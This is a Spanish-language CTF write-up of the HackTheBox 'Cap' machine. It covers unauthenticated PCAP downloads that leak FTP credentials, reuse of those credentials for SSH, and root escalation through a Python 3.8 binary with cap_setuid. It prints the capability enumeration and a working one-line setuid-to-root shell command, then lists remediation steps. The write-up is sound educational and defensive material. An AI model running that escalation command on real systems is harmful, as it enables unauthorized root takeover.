## Metodología de análisis del vector inicial

El vector de entrada se priorizó en el panel web "Security Dashboard" porque el endpoint `/capture` sugería acceso a capturas de tráfico de red históricas. Si las capturas anteriores eran accesibles sin autenticación en rutas numeradas, cualquier tráfico no cifrado (como FTP o HTTP) almacenado en esos PCAP podría exponer credenciales en texto claro.

La reutilización de credenciales entre servicios era una hipótesis razonable: si obteníamos credenciales FTP era probable que también funcionaran para SSH.

## Investigación de vulnerabilidades

Esta máquina no depende de CVEs específicas sino de malas prácticas de configuración:

- **Fuga de información en PCAP**: El panel web permitía acceder a capturas de tráfico histórico sin autenticación, exponiendo credenciales FTP en texto claro.
- **Reutilización de credenciales**: Las mismas credenciales funcionaban para FTP y SSH, amplificando el impacto de la fuga.
- **Capabilities mal configuradas**: Python 3.8 tenía `cap_setuid+ep`, permitiendo escalada a root mediante `os.setuid(0)` sin necesidad de exploits de kernel.

## Escalada de privilegios

Revisamos las capabilities de los binarios y descubrimos que `python3.8` tiene `cap_setuid`, lo que nos permite escalar a root.

```bash
nathan@cap:/$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Con `cap_setuid` en Python, ejecutamos `os.setuid(0)` para cambiarnos a root y lanzamos una shell interactiva.

```bash
nathan@cap:/$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
```

## Lecciones técnicas

- Un panel web que permite visualizar capturas de tráfico de red puede exponer credenciales en texto claro si el tráfico incluye protocolos no cifrados como FTP o Telnet.
- La reutilización de credenciales entre servicios (FTP y SSH en este caso) amplifica el impacto de una fuga de credenciales.
- Las capacidades de Linux (`capabilities`) mal configuradas en binarios como Python pueden permitir escalada directa a root sin necesidad de exploit kernel.
- El uso de `cap_setuid` en un intérprete de Python permite invocar `os.setuid(0)` para obtener una shell con privilegios máximos.

## Remediación

1. Deshabilitar el acceso a capturas de tráfico histórico para usuarios no autorizados, o implementar cifrado obligatorio en servicios de transferencia de archivos.
2. Prohibir la reutilización de contraseñas entre servicios y forzar el uso de claves SSH en lugar de contraseñas para acceso remoto.
3. Revisar y auditar las capacidades de Linux en binarios del sistema: `python3.8` no debería tener `cap_setuid` en un entorno de producción.
4. Actualizar el sistema y aplicar principios de mínimo privilegio, eliminando capacidades innecesarias con `setcap -r /usr/bin/python3.8`.
5. Implementar controles de integridad y monitoreo para detectar cambios de UID o ejecución de shells con privilegios elevados.

## Conclusión

HTB Cap es una máquina de dificultad Easy que combina una fuga de información en un panel web que expone capturas PCAP históricas con credenciales FTP en texto claro, reutilización de credenciales para acceso SSH, y escalada a root mediante una capability `cap_setuid` mal configurada en Python 3.8. La lección principal es que las capabilities de Linux deben auditarse rigurosamente — un intérprete con `cap_setuid` permite escalada directa a root en un solo comando.
